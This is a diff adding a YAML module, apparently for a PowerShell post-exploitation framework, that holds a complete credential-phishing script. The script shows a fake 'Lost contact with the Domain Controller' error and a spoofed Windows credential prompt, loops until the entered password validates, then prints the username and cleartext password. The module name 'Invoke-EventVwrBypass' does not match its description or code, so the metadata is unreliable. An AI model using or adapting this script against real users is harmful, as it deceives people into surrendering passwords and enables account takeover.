@@ -1,0 +1,78 @@
+name: Invoke-EventVwrBypass
+authors:
+  - 'greg.fossk'
+  - '@harmj0y'
+  - 'enigma0x3'
+description: |
+  Prompts the current user to enter their credentials in a forms box and returns the results.
+software:
+techniques:
+  - T1141
+  - T1514
+background: false
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - 'http://blog.logrhythm.com/security/do-you-trust-your-computer/'
+  - 'https://enigma0x3.wordpress.com/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/'
+options:
+  - name: Agent
+    description: Agent to run module on.
+    required: true
+    value: ''
+  - name: MsgText
+    description: Message text to display if not waiting for a process create.
+    required: true
+    value: 'Lost contact with the Domain Controller.'
+  - name: IconType
+    description: Critical, Question, Exclamation, or Information
+    required: true
+    value: 'Critical'
+  - name: Title
+    description: Title of the message box to display if not waiting for a process create.
+    required: true
+    value: 'ERROR - 0xA801B720'
+script: |
+  # Adapted from http://blog.logrhythm.com/security/do-you-trust-your-computer/
+  # https://enigma0x3.wordpress.com/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/
+  #   POC from greg.foss[at]owasp.org
+  #   @enigma0x3
+
+  function Invoke-Prompt {
+      [CmdletBinding()]
+      Param (
+          [Switch] $ProcCreateWait,
+
+          [String] $MsgText = 'Lost contact with the Domain Controller.',
+
+          [String] $IconType = 'Critical',
+
+          [String] $Title = 'ERROR - 0xA801B720'
+      )
+
+      Add-Type -AssemblyName Microsoft.VisualBasic
+      Add-Type -assemblyname System.DirectoryServices.AccountManagement
+      $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
+
+
+      if($MsgText -and $($MsgText -ne '')){
+          $null = [Microsoft.VisualBasic.Interaction]::MsgBox($MsgText, "OKOnly,MsgBoxSetForeground,SystemModal,$IconType", $Title)
+      }
+
+      $c=[System.Security.Principal.WindowsIdentity]::GetCurrent().name
+      $credential = $host.ui.PromptForCredential("Credentials Required", "Please enter your user name and password.", $c, "NetBiosUserName")
+
+      if($credential){
+             while($DS.ValidateCredentials($c, $credential.GetNetworkCredential().password) -ne $True){
+                $credential = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
+            }
+          "[+] Prompted credentials: -> " + $c + ":" + $credential.GetNetworkCredential().password
+      }
+      else{
+          "[!] User closed credential prompt"
+      }
+  }
+script_end: Invoke-Prompt {{ PARAMS }}
